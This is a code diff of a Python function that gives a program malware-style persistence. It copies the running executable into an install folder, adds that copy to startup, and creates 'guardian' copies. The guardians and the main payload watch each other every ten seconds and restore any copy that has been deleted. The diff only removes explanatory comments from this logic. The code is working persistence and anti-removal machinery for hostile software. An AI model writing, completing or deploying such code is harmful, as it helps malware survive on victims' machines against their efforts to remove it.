@@ -34,36 +34,30 @@ def manage_resilience():
     """Main function to setup and maintain resilience."""
     time.sleep(2) # Give a moment for the initial execution to settle
     
-    # Determine if this instance is a guardian or the main payload
     current_exe = os.path.basename(sys.executable)
     is_guardian = current_exe.startswith(GUARDIAN_PREFIX)
     main_payload_path = os.path.join(INSTALL_DIR, PAYLOAD_NAME)
 
-    # --- INITIAL SETUP ---
     if not os.path.exists(INSTALL_DIR):
         os.makedirs(INSTALL_DIR)
         shutil.copy2(sys.executable, main_payload_path)
         add_to_startup(main_payload_path)
         create_guardians(main_payload_path)
 
-    # --- RESILIENCE LOOP ---
     while True:
         if is_guardian:
-            # Guardian's job: Check if the main payload exists.
             if not os.path.exists(main_payload_path):
-                # Try to acquire a lock before reviving
                 if not os.path.exists(LOCK_FILE):
                     try:
-                        open(LOCK_FILE, 'w').close() # Create lock file
+                        open(LOCK_FILE, 'w').close()
                         shutil.copy2(sys.executable, main_payload_path)
-                        os.remove(LOCK_FILE) # Release lock
+                        os.remove(LOCK_FILE)
                     except Exception:
-                        pass # Another guardian was faster
+                        pass
         else:
-            # Main payload's job: Check if guardians exist.
             for i in range(NUM_GUARDIANS):
                 guardian_path = os.path.join(INSTALL_DIR, f"{GUARDIAN_PREFIX}{i}.exe")
                 if not os.path.exists(guardian_path):
                     shutil.copy2(main_payload_path, guardian_path)
         
-        time.sleep(10) # Check every 10 seconds
+        time.sleep(10)
